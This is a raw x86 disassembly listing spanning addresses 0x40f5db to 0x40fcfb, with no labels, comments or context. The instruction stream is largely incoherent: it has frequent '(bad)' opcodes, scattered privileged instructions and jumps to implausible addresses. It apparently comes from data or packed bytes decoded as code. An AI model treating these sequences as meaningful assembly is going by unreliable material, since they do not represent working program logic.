  40f5db:	or     BYTE PTR [ebp-0xfe00bb],al
  40f5e1:	jmp    0x13ff86b
  40f5e6:	dec    DWORD PTR [esi]
  40f5e8:	mov    ecx,ecx
  40f5ea:	loopne 0x40f571
  40f5ec:	mov    DWORD PTR [edx],0x4d8b00c3
  40f5f2:	sbb    al,0x8b
  40f5f4:	out    dx,al
  40f5f5:	mov    eax,DWORD PTR [eax]
  40f5f7:	push   eax
  40f5f8:	push   eax
  40f5f9:	test   DWORD PTR [ebp-0x1],eax
  40f5fc:	mov    edi,edi
  40f5fe:	cwde   
  40f5ff:	inc    ebp
  40f600:	add    BYTE PTR [ebx],dh
  40f602:	mov    DWORD PTR [ebx],0x24ff8918
  40f608:	add    al,0xff
  40f60a:	add    BYTE PTR [ebx-0x5ae30f77],cl
  40f610:	(bad)  
  40f611:	(bad)  
  40f612:	(bad)  
  40f613:	(bad)  
  40f614:	push   DWORD PTR [ebx]
  40f616:	or     BYTE PTR [ebx],al
  40f618:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  40f61f:	(bad)  
  40f620:	cld    
  40f621:	sbb    BYTE PTR [ebx+0x765050ff],al
  40f627:	inc    ebp
  40f628:	mov    esi,DWORD PTR [ebx]
  40f62a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f62b:	add    ecx,esi
  40f62d:	push   eax
  40f62e:	mov    BYTE PTR [ebp+0x4d],0x5
  40f632:	jmp    0x40f634
  40f634:	mov    eax,DWORD PTR [eax]
  40f636:	clc    
  40f637:	mov    ecx,DWORD PTR [esp+ebx*1]
  40f63a:	inc    DWORD PTR [eax+0x5501fc]
  40f640:	mov    BYTE PTR [ebp-0xe70075],al
  40f646:	cmp    eax,DWORD PTR [eax]
  40f648:	push   eax
  40f649:	add    cl,ch
  40f64b:	xor    BYTE PTR [esi+0x4d],cl
  40f64e:	add    edi,edi
  40f650:	mov    ecx,DWORD PTR [eax]
  40f652:	mov    al,ds:0x8b8b004d
  40f657:	mov    ebp,DWORD PTR [ebx]
  40f659:	hlt    
  40f65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f65b:	add    dh,al
  40f65d:	add    DWORD PTR [ebp+0x45],edx
  40f660:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  40f666:	dec    ebp
  40f667:	inc    eax
  40f668:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  40f66e:	add    BYTE PTR [ebx-0x38162400],cl
  40f674:	add    bl,al
  40f676:	add    BYTE PTR [ebp-0x2e003e],al
  40f67c:	mov    DWORD PTR [ebp-0x10],eax
  40f67f:	mov    DWORD PTR [ebp+0x28],esp
  40f682:	push   eax
  40f683:	dec    DWORD PTR [ecx+0x5518e88d]
  40f689:	dec    DWORD PTR [ecx+0x5545f050]
  40f68f:	xor    ecx,DWORD PTR [edi]
  40f691:	add    edx,DWORD PTR [edx]
  40f693:	push   eax
  40f694:	xchg   ebp,eax
  40f695:	inc    ebp
  40f696:	inc    DWORD PTR ds:0xe200ff
  40f69c:	jnp    0x809612a2
  40f6a2:	mov    eax,DWORD PTR [ecx]
  40f6a4:	pusha  
  40f6a5:	add    bh,bh
  40f6a7:	test   ecx,eax
  40f6a9:	dec    DWORD PTR [edi+edi*8]
  40f6ac:	ret    0x8d00
  40f6af:	add    bh,bh
  40f6b1:	mov    ch,0xd7
  40f6b3:	(bad)  
  40f6b4:	cli    
  40f6b5:	inc    DWORD PTR [ebp+0x2255f830]
  40f6bb:	test   DWORD PTR [ebp+0x74],ecx
  40f6be:	add    ecx,DWORD PTR [ebx+0x65a01889]
  40f6c4:	or     BYTE PTR [eax],al
  40f6c6:	cmp    DWORD PTR [eax+0x74],edi
  40f6c9:	add    BYTE PTR [ebx+0x114dfc23],cl
  40f6cf:	sub    eax,DWORD PTR [eax]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x77]
  40f6d4:	mov    eax,edi
  40f6d6:	add    DWORD PTR [ebx],eax
  40f6d8:	inc    ebp
  40f6d9:	dec    ebp
  40f6da:	mov    ecx,DWORD PTR [edx+0x45450118]
  40f6e0:	add    cl,BYTE PTR [ebx+0x875fc4d]
  40f6e6:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e9:	inc    eax
  40f6ea:	push   ebp
  40f6eb:	push   ecx
  40f6ec:	mov    esi,DWORD PTR [edx-0x14]
  40f6ef:	mov    edx,DWORD PTR [ecx+0xce003c]
  40f6f5:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  40f6fc:	add    al,0x55
  40f6fe:	push   ebp
  40f6ff:	add    ecx,DWORD PTR [ecx-0x2d030777]
  40f705:	push   ecx
  40f706:	test   DWORD PTR [ebx],eax
  40f708:	dec    DWORD PTR [ecx+0x554518ff]
  40f70e:	mov    edi,eax
  40f710:	sbb    al,0xec
  40f712:	inc    DWORD PTR [eax]
  40f714:	mov    DWORD PTR [eax],0xff8318
  40f71a:	add    al,0x83
  40f71c:	add    al,bh
  40f71e:	mov    ebp,edx
  40f720:	push   eax
  40f721:	push   ebp
  40f722:	test   DWORD PTR [edi+edi*8-0x73],esi
  40f726:	dec    DWORD PTR [eax]
  40f728:	inc    ebp
  40f729:	push   ebp
  40f72a:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  40f730:	and    al,0x8b
  40f732:	(bad)  
  40f733:	call   0x89ddaec5
  40f738:	test   DWORD PTR [eax-0x1],esp
  40f73b:	(bad)  
  40f73c:	inc    DWORD PTR [ecx+0xffff85]
  40f742:	dec    DWORD PTR [ecx-0x6a1f5f75]
  40f748:	(bad)  
  40f749:	inc    ebx
  40f74b:	dec    DWORD PTR [ebx-0x117ee316]
  40f751:	arpl   WORD PTR [eax],ax
  40f753:	int    0x50
  40f755:	xor    eax,DWORD PTR [ebp-0x7f]
  40f758:	mov    esi,DWORD PTR [eax]
  40f75a:	cwde   
  40f75b:	pushf  
  40f75c:	add    BYTE PTR [ebp-0x1],dh
  40f75f:	mov    edi,edi
  40f761:	mov    al,ds:0x4d45ce08
  40f766:	inc    DWORD PTR [ebx]
  40f768:	adc    al,0x83
  40f76a:	add    BYTE PTR [eax],0x1
  40f76d:	adc    BYTE PTR [eax],al
  40f76f:	push   ebp
  40f770:	inc    ebp
  40f771:	add    edi,edi
  40f773:	mov    edx,DWORD PTR [eax]
  40f775:	mov    ecx,DWORD PTR [ebp-0x60]
  40f778:	push   esi
  40f779:	adc    al,0x8
  40f77b:	mov    edx,DWORD PTR [ebp-0x8]
  40f77e:	mov    ecx,DWORD PTR [ebp-0x4]
  40f781:	add    DWORD PTR [ebp-0x18],0xffffff8d
  40f785:	inc    DWORD PTR [eax+esi*8]
  40f788:	inc    ebp
  40f789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f78a:	mov    edx,DWORD PTR [ebp+0x1c]
  40f78d:	add    DWORD PTR [ebp-0x14],eax
  40f790:	mov    edx,DWORD PTR [ebp-0x70]
  40f793:	cmp    eax,DWORD PTR [eax]
  40f795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f796:	mov    eax,DWORD PTR [eax]
  40f798:	sbb    al,0x73
  40f79a:	add    BYTE PTR [ebx],0x1
  40f79d:	hlt    
  40f79e:	add    BYTE PTR [eax+0x30],dl
  40f7a1:	mov    DWORD PTR [ecx],esi
  40f7a3:	hlt    
  40f7a4:	pop    ds
  40f7a5:	inc    ebp
  40f7a6:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  40f7ac:	(bad)  
  40f7ad:	push   DWORD PTR [edi]
  40f7af:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  40f7b5:	push   DWORD PTR [ebx-0x1]
  40f7b8:	mov    eax,DWORD PTR [ebp-0x740075]
  40f7be:	sub    eax,DWORD PTR [eax]
  40f7c0:	add    eax,DWORD PTR [eax]
  40f7c2:	mov    DWORD PTR [ecx+0x5f],eax
  40f7c5:	mov    DWORD PTR [ebx+0x20],ebx
  40f7c8:	ret    0xff
  40f7cb:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  40f7d1:	ret    
  40f7d2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f7d8:	add    BYTE PTR [ebp-0x7d],al
  40f7db:	mov    DWORD PTR [eax],eax
  40f7dd:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  40f7e4:	sar    bh,cl
  40f7e6:	test   BYTE PTR [eax+0x1],dl
  40f7e9:	inc    ebp
  40f7ea:	add    BYTE PTR [ebx],dh
  40f7ec:	test   BYTE PTR [ebx],0x84
  40f7ef:	push   eax
  40f7f0:	add    BYTE PTR [ebp+0x0],al
  40f7f3:	add    eax,0x86
  40f7f8:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f7fe:	add    BYTE PTR [ecx],al
  40f800:	add    BYTE PTR [eax],al
  40f802:	mov    esi,0x550030
  40f807:	mov    ecx,DWORD PTR [edi]
  40f809:	sbb    al,0xda
  40f80b:	jne    0x40f80d
  40f80d:	mov    edi,DWORD PTR [ecx]
  40f80f:	xor    BYTE PTR [eax+eax*1],0x84
  40f813:	add    eax,DWORD PTR [eax]
  40f815:	cld    
  40f816:	add    BYTE PTR [ebp-0x4f],dh
  40f819:	mov    eax,DWORD PTR [ecx]
  40f81b:	cld    
  40f81c:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f822:	retf   0xe45
  40f825:	add    eax,edx
  40f827:	sbb    al,0xb7
  40f829:	dec    ebp
  40f82a:	or     al,0x89
  40f82c:	dec    ebp
  40f82d:	sbb    al,0xf
  40f82f:	inc    ebp
  40f830:	dec    eax
  40f831:	mov    eax,DWORD PTR [ebx]
  40f833:	sbb    al,0xf
  40f835:	nop
  40f836:	scas   al,BYTE PTR es:[edi]
  40f837:	add    DWORD PTR [eax],eax
  40f839:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f83f:	mov    eax,gs
  40f841:	add    bh,bh
  40f843:	mov    edi,edi
  40f845:	cmp    DWORD PTR [edi+0x72],edx
  40f848:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f84e:	gs cmp al,0x0
  40f851:	je     0x40f829
  40f853:	push   eax
  40f854:	sar    BYTE PTR [eax],1
  40f856:	mov    bh,0x3e
  40f858:	push   cs
  40f859:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f85f:	add    DWORD PTR [ecx+0x12],ebp
  40f862:	dec    edx
  40f863:	(bad)  
  40f864:	mov    eax,edx
  40f866:	in     al,dx
  40f867:	adc    DWORD PTR [ecx],esi
  40f869:	pop    esi
  40f86a:	inc    ecx
  40f86b:	leave  
  40f86c:	or     DWORD PTR [eax],ebx
  40f86e:	gs push ebp
  40f870:	add    ah,ch
  40f872:	into   
  40f873:	in     al,dx
  40f874:	enter  0xb756,0xf0
  40f878:	push   cs
  40f879:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f883:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f889:	jnp    0x74417d91
  40f88f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f895:	add    BYTE PTR [edi],cl
  40f897:	mov    edi,DWORD PTR [ecx-0x78]
  40f89a:	ltr    WORD PTR [ecx-0x7b]
  40f89e:	dec    DWORD PTR [edi]
  40f8a0:	clc    
  40f8a1:	out    0x45,eax
  40f8a3:	add    BYTE PTR [eax],cl
  40f8a5:	cmp    ebx,0xffffff8c
  40f8a8:	jge    0x40f8aa
  40f8aa:	jb     0x40f8bc
  40f8ac:	je     0x4ff92c
  40f8b2:	pop    edx
  40f8b3:	push   esi
  40f8b4:	mov    ecx,DWORD PTR [edi]
  40f8b6:	in     al,dx
  40f8b7:	rol    DWORD PTR [ebp+0x0],1
  40f8ba:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f8c1:	cmp    DWORD PTR [ecx],0xfffffff0
  40f8c4:	hlt    
  40f8c5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f8cb:	(bad)  
  40f8cd:	push   eax
  40f8ce:	jns    0xb840dd4c
  40f8d4:	lock push cs
  40f8d6:	ror    edx,0x3
  40f8d9:	test   BYTE PTR [ecx+0x5500e800],cl
  40f8df:	dec    eax
  40f8e0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f8e4:	(bad)  
  40f8e5:	mov    esi,0x7f33ff5f
  40f8ea:	inc    eax
  40f8eb:	test   DWORD PTR [edx],eax
  40f8ed:	je     0x40f8af
  40f8ef:	mov    ecx,ecx
  40f8f1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f8f5:	and    eax,DWORD PTR [eax+0xf0103]
  40f8fb:	jp     0x40f8e9
  40f8fd:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f901:	add    edx,DWORD PTR [edi+0x74]
  40f904:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f90a:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f910:	je     0x40f895
  40f912:	cmp    eax,edi
  40f914:	js     0x40f939
  40f916:	add    eax,0xeb0fc003
  40f91b:	jns    0x40f8a8
  40f91d:	vmread DWORD PTR [ecx+0x45],ebx
  40f921:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f927:	adc    al,0x8b
  40f929:	jge    0x40f93f
  40f92b:	mov    edi,DWORD PTR [eax-0x4]
  40f92e:	add    edi,DWORD PTR [edi]
  40f930:	or     bh,bh
  40f932:	push   ebp
  40f933:	push   es
  40f934:	mov    DWORD PTR [ebp-0x4],ebx
  40f937:	add    edi,esi
  40f939:	pop    es
  40f93a:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f940:	mov    DWORD PTR [esp+esi*8],ecx
  40f943:	inc    ebp
  40f944:	pop    ebp
  40f945:	xor    DWORD PTR [esi-0x4],0x3b
  40f949:	add    edx,DWORD PTR [ecx+edi*1]
  40f94c:	push   es
  40f94d:	clc    
  40f94e:	mov    bh,0xdb
  40f950:	jp     0x40f909
  40f952:	add    cl,BYTE PTR [esi]
  40f954:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f95a:	test   edi,edi
  40f95c:	je     0x40f952
  40f95e:	mov    eax,ecx
  40f960:	or     BYTE PTR [ebx],al
  40f962:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f968:	jbe    0x40f9dc
  40f96a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f970:	add    ecx,DWORD PTR [esi]
  40f972:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f978:	add    eax,DWORD PTR [ebx-0x287af783]
  40f97e:	je     0x40f9cd
  40f980:	mov    DWORD PTR [ecx],edi
  40f982:	mov    esi,eax
  40f984:	hlt    
  40f985:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f98c:	jb     0x40f94e
  40f98e:	jmp    0x40f97b
  40f990:	xor    esi,DWORD PTR [ebx]
  40f992:	pop    edi
  40f993:	pop    esi
  40f994:	pop    ebx
  40f995:	ret    
  40f996:	ret    0x8b
  40f999:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f99f:	xor    DWORD PTR ds:0x89339c0c,0x56
  40f9a6:	cld    
  40f9a7:	cmp    DWORD PTR [ebp+0xf],eax
  40f9aa:	xor    al,BYTE PTR [ebp-0x7474ff64]
  40f9b0:	cld    
  40f9b1:	or     al,0x4d
  40f9b3:	ret    
  40f9b4:	mov    edi,DWORD PTR [esi-0x4]
  40f9b7:	pop    eax
  40f9b8:	dec    ebp
  40f9b9:	jne    0x40f946
  40f9bb:	xor    edi,esp
  40f9bd:	inc    eax
  40f9be:	dec    ebp
  40f9bf:	jbe    0x40fa14
  40f9c1:	inc    eax
  40f9c2:	pop    ebp
  40f9c3:	add    edx,DWORD PTR [esi+0x8]
  40f9c6:	push   esi
  40f9c7:	dec    eax
  40f9c8:	push   ecx
  40f9c9:	mov    eax,edi
  40f9cb:	and    al,0xf0
  40f9cd:	jo     0x40f9ba
  40f9cf:	mov    eax,DWORD PTR [ebx]
  40f9d1:	sbb    BYTE PTR [ebp+0x4d],cl
  40f9d4:	mov    eax,DWORD PTR [ebx]
  40f9d6:	nop
  40f9d7:	or     BYTE PTR [eax],al
  40f9d9:	jne    0x40fa32
  40f9db:	cmp    ebx,DWORD PTR [ebp+0x33893277]
  40f9e1:	cld    
  40f9e2:	xor    edi,edi
  40f9e4:	add    edi,DWORD PTR [ebp+0x3]
  40f9e7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f9ed:	js     0x40f973
  40f9ef:	jae    0x40f9f3
  40f9f1:	(bad)  
  40f9f3:	xor    al,0x5d
  40f9f5:	jmp    0x40f982
  40f9f7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f9fe:	fdecstp 
  40fa00:	test   BYTE PTR [edi],ah
  40fa02:	add    bh,BYTE PTR [ebp+0x0]
  40fa05:	add    ebx,DWORD PTR [ebp-0x77]
  40fa08:	mov    edi,eax
  40fa0a:	cmp    al,0x0
  40fa0d:	adc    dh,BYTE PTR [ebx]
  40fa0f:	jge    0x40fa14
  40fa11:	mov    edi,DWORD PTR [ebx]
  40fa13:	jl     0x40fa24
  40fa15:	clc    
  40fa16:	dec    edi
  40fa17:	jge    0x40fa19
  40fa19:	mov    eax,DWORD PTR [ebx]
  40fa1b:	jb     0x40fa25
  40fa1d:	mov    ecx,DWORD PTR [ebp-0x8]
  40fa20:	mov    edi,edi
  40fa22:	xor    edx,DWORD PTR [eax]
  40fa24:	add    edi,DWORD PTR [ebx]
  40fa26:	mov    DWORD PTR [ebp-0x10],edi
  40fa29:	inc    edi
  40fa2a:	pop    ebp
  40fa2b:	jge    0x40fa68
  40fa2d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40fa31:	mov    edx,0xc05d87f0
  40fa36:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40fa3a:	fimul  WORD PTR [eax]
  40fa3c:	fist   WORD PTR [ebp+0x1c]
  40fa3f:	in     al,dx
  40fa40:	jne    0x40fa2e
  40fa42:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40fa48:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40fa4c:	fdivp  st(0),st
  40fa4e:	fild   WORD PTR [ebp+0x4510f85c]
  40fa54:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40fa5a:	inc    ebp
  40fa5b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40fa61:	mov    ebp,DWORD PTR [ebx-0x4]
  40fa64:	adc    al,0x8b
  40fa66:	rcl    DWORD PTR [eax],0x48
  40fa69:	mov    esi,0x7080803
  40fa6e:	fiadd  WORD PTR [ebp+0x4d]
  40fa71:	(bad)  
  40fa72:	mov    edx,DWORD PTR [edx-0x4]
  40fa75:	mov    edx,DWORD PTR [ebp-0x4]
  40fa78:	xor    ebx,DWORD PTR [ebx+0x330103]
  40fa7e:	mov    DWORD PTR [edi+0x872dc],edi
  40fa84:	xlat   BYTE PTR ds:[ebx]
  40fa85:	into   
  40fa86:	ffreep st(6)
  40fa88:	retf   0x6c7
  40fa8b:	iret   
  40fa8c:	dec    ebp
  40fa8d:	inc    ebp
  40fa8e:	mov    DWORD PTR [ebx],edi
  40fa90:	fmul   QWORD PTR [edi]
  40fa92:	dec    ebp
  40fa93:	jnp    0x40fac8
  40fa95:	add    BYTE PTR [ebx],al
  40fa97:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa9a:	inc    ebp
  40fa9b:	dec    ebp
  40fa9c:	lea    esi,[ebx]
  40fa9e:	add    DWORD PTR [ebx],eax
  40faa0:	jb     0x40fadd
  40faa2:	add    BYTE PTR [edi],cl
  40faa4:	inc    ebp
  40faa5:	imul   eax,edi,0x858bd800
  40faab:	cld    
  40faac:	clc    
  40faad:	mov    DWORD PTR [ebp+0x0],eax
  40fab0:	inc    DWORD PTR [eax]
  40fab2:	or     al,0xde
  40fab4:	sbb    bh,0x1
  40fab7:	retf   
  40fab8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40fabf:	dec    ebp
  40fac0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40fac6:	enter  0x12de,0xdf
  40faca:	inc    ebp
  40facb:	pop    ebp
  40facc:	dec    DWORD PTR [ebx-0x257f0ff4]
  40fad2:	add    DWORD PTR [edx],edx
  40fad4:	add    BYTE PTR [ebp+0x50],dl
  40fad7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40fadd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40fae3:	or     ah,al
  40fae5:	pop    ss
  40fae6:	cdq    
  40fae7:	push   ebp
  40fae8:	clc    
  40fae9:	mov    eax,DWORD PTR [ebp-0x4]
  40faec:	xor    edx,edx
  40faee:	add    esi,DWORD PTR [ebx]
  40faf0:	cmp    eax,DWORD PTR [ebx]
  40faf2:	hlt    
  40faf3:	cmp    DWORD PTR [ebx],esp
  40faf5:	or     al,BYTE PTR [ebp+0xf]
  40faf8:	mov    eax,DWORD PTR [edx]
  40fafa:	loopne 0x40fafc
  40fafc:	(bad)  
  40fafd:	mov    ecx,esi
  40faff:	cld    
  40fb00:	pushf  
  40fb01:	pop    ebp
  40fb02:	popf   
  40fb03:	mov    esi,DWORD PTR [edx]
  40fb05:	lock mov eax,eax
  40fb08:	adc    BYTE PTR [ebx],al
  40fb0a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40fb11:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40fb17:	dec    ebp
  40fb18:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40fb1e:	(bad)  
  40fb1f:	iret   
  40fb20:	inc    ebp
  40fb21:	(bad)  
  40fb22:	jne    0x40fb71
  40fb24:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40fb2a:	(bad)  
  40fb2b:	cmp    ebx,eax
  40fb2d:	je     0x40fab5
  40fb2f:	add    edi,edi
  40fb31:	or     bh,bh
  40fb33:	dec    ebp
  40fb34:	inc    ebp
  40fb35:	mov    esi,DWORD PTR [ebx]
  40fb37:	cld    
  40fb38:	add    ecx,esi
  40fb3a:	cmp    ecx,DWORD PTR [eax-0xc]
  40fb3d:	mov    edx,DWORD PTR [edi]
  40fb3f:	or     BYTE PTR [ebp-0x7c],al
  40fb42:	mov    ebx,DWORD PTR [ebp-0x7639cd18]
  40fb48:	test   BYTE PTR [ebx*4-0x76c1cdbb],cl
  40fb4f:	pushf  
  40fb50:	call   0x51eae0
  40fb55:	jne    0x40fb1e
  40fb57:	mov    ebp,esp
  40fb59:	fcomp  DWORD PTR [ebx]
  40fb5b:	add    BYTE PTR [ecx],al
  40fb5d:	inc    DWORD PTR [ebp-0x75]
  40fb60:	(bad)  
  40fb61:	cld    
  40fb62:	add    al,0xce
  40fb64:	mov    ecx,edi
  40fb66:	cld    
  40fb67:	inc    ebp
  40fb68:	fidivr WORD PTR [ebx]
  40fb6a:	fbstp  TBYTE PTR [ebp-0x3e]
  40fb6d:	mov    eax,DWORD PTR [eax]
  40fb6f:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fb75:	fadd   st,st(7)
  40fb77:	add    BYTE PTR [ebp-0x1],al
  40fb7a:	mov    ecx,DWORD PTR [esp+edi*8]
  40fb7d:	inc    ebp
  40fb7e:	mov    bh,0xc7
  40fb81:	loopne 0x40fbc8
  40fb83:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fb89:	sbb    dh,BYTE PTR [ebx]
  40fb8b:	pushf  
  40fb8c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fb92:	mov    eax,edi
  40fb94:	cwde   
  40fb95:	inc    ebp
  40fb96:	inc    ebp
  40fb97:	jne    0x40fb24
  40fb99:	mov    esp,esp
  40fb9b:	clc    
  40fb9c:	add    al,0x4d
  40fb9e:	mov    DWORD PTR [ebx],esi
  40fba0:	or     al,0x33
  40fba2:	inc    ebp
  40fba3:	lea    ecx,[ebx-0x398d13fd]
  40fba9:	add    bh,al
  40fbab:	inc    ebp
  40fbac:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fbb3:	add    ebp,esp
  40fbb5:	shufps xmm1,xmm3,0xc7
  40fbb9:	(bad)  
  40fbba:	jmp    0x748636e3
  40fbbf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fbc5:	hlt    
  40fbc6:	mov    ecx,DWORD PTR [edi]
  40fbc8:	fadd   DWORD PTR [ebp+0x0]
  40fbcb:	xor    ecx,DWORD PTR [edi]
  40fbcd:	add    ecx,ecx
  40fbcf:	cmp    edi,edi
  40fbd1:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fbd5:	(bad)  
  40fbd6:	jmp    0x40fb63
  40fbd8:	mov    edi,esp
  40fbda:	or     al,0xc6
  40fbdc:	inc    ebp
  40fbdd:	(bad)  
  40fbde:	mov    eax,DWORD PTR [ebp+0x10]
  40fbe1:	jne    0x40fb6c
  40fbe3:	mov    eax,DWORD PTR [ecx]
  40fbe5:	clc    
  40fbe6:	add    BYTE PTR [ebp-0x40],cl
  40fbe9:	xor    edx,DWORD PTR [eax-0x73]
  40fbec:	jne    0x40fbef
  40fbee:	push   DWORD PTR [edx+0x8]
  40fbf1:	add    BYTE PTR [ebp+0x45],al
  40fbf4:	mov    ebp,ecx
  40fbf6:	cld    
  40fbf7:	add    BYTE PTR [ebp+0x0],cl
  40fbfa:	xor    eax,DWORD PTR [ebp+0x3]
  40fbfd:	lea    edi,[ebx]
  40fbff:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40fc05:	sub    eax,0x5d330e4d
  40fc0a:	lea    esi,[ebx]
  40fc0c:	add    DWORD PTR [ebx],eax
  40fc0e:	jb     0x40fbf9
  40fc10:	add    BYTE PTR [eax],al
  40fc12:	inc    ebp
  40fc13:	add    bl,ch
  40fc15:	inc    ebp
  40fc16:	mov    esi,DWORD PTR [ebx]
  40fc18:	or     al,0x3
  40fc1a:	(bad)  
  40fc1b:	mov    edi,eax
  40fc1d:	in     al,dx
  40fc1e:	scas   eax,DWORD PTR es:[edi]
  40fc1f:	inc    ebp
  40fc20:	mov    esi,DWORD PTR [ebx]
  40fc22:	in     al,0x3
  40fc24:	add    al,0x89
  40fc26:	mov    ecx,DWORD PTR [eax+edi*8]
  40fc29:	dec    ebp
  40fc2a:	(bad)  
  40fc2b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3163]
  40fc32:	mov    ecx,eax
  40fc34:	cld    
  40fc35:	push   es
  40fc36:	dec    ebp
  40fc37:	add    al,0x33
  40fc39:	mov    DWORD PTR [ebx],eax
  40fc3b:	in     al,dx
  40fc3c:	cmp    DWORD PTR [ebp-0x67],eax
  40fc3f:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fc45:	mov    edx,DWORD PTR [ebp-0x4]
  40fc48:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc4b:	xor    ecx,DWORD PTR [ebp+0x3]
  40fc4e:	cmp    DWORD PTR [ebx],0x8b32749c
  40fc54:	xor    edi,esp
  40fc56:	jmp    0xff74f9a8
  40fc5b:	add    ecx,DWORD PTR [ebp-0x3f]
  40fc5e:	xor    ebx,DWORD PTR [edi]
  40fc60:	add    eax,ecx
  40fc62:	cmp    ebx,DWORD PTR [eax]
  40fc64:	mov    ecx,DWORD PTR [ebp-0x4]
  40fc67:	mov    ecx,DWORD PTR [eax]
  40fc69:	adc    BYTE PTR [ebp-0x80],al
  40fc6c:	jmp    0x40fc6f
  40fc6e:	mov    eax,DWORD PTR [eax]
  40fc70:	cld    
  40fc71:	mov    bh,0xc6
  40fc73:	push   ecx
  40fc74:	(bad)  
  40fc75:	jne    0x40fcd5
  40fc77:	dec    ecx
  40fc79:	or     BYTE PTR [ecx+ebx*1],cl
  40fc7c:	push   ebp
  40fc7d:	inc    ebp
  40fc7e:	in     al,dx
  40fc7f:	add    ebp,esp
  40fc81:	or     bh,al
  40fc83:	dec    ebp
  40fc84:	cld    
  40fc85:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fc8b:	xor    DWORD PTR [edx],0x2
  40fc8e:	pushf  
  40fc8f:	dec    DWORD PTR [ebx+0x45510cf4]
  40fc95:	mov    DWORD PTR [ebx+0x5645fc0c],ecx
  40fc9b:	mov    edx,DWORD PTR [ecx+0xc]
  40fc9e:	xor    eax,esi
  40fca0:	mov    edx,0xc172c7
  40fca5:	inc    ebp
  40fca6:	mov    esi,DWORD PTR [ebp+0x8]
  40fca9:	mov    eax,edx
  40fcab:	call   0x84c5c3a0
  40fcb0:	add    DWORD PTR [ebp-0x76bace00],ebx
  40fcb6:	mov    ebp,eax
  40fcb8:	or     BYTE PTR [eax],dl
  40fcba:	jo     0x40fd09
  40fcbc:	push   edi
  40fcbd:	xor    esi,DWORD PTR [ebp+0x3]
  40fcc0:	(bad)  
  40fcc1:	pmulhuw mm0,mm1
  40fcc4:	test   DWORD PTR [ebp-0x8],ecx
  40fcc7:	mov    DWORD PTR [ebp-0x67],eax
  40fcca:	mov    eax,DWORD PTR [ebp-0x4]
  40fccd:	xor    edi,DWORD PTR [ebp-0x73]
  40fcd0:	xor    eax,DWORD PTR [ebx]
  40fcd2:	xor    esi,DWORD PTR [edx+0x3]
  40fcd5:	add    BYTE PTR [ecx],bh
  40fcd7:	inc    ebp
  40fcd8:	(bad)  
  40fcd9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fcdf:	mov    DWORD PTR [eax],0x750f0004
  40fce5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fceb:	lock add BYTE PTR [ebp+0x0],al
  40fcef:	mov    esi,DWORD PTR [ebp-0x2c]
  40fcf2:	mov    ebp,edx
  40fcf4:	or     al,0x72
  40fcf6:	ja     0x40fcf8
  40fcf8:	mov    edx,esi
  40fcfa:	cld    
  40fcfb:	(bad)  
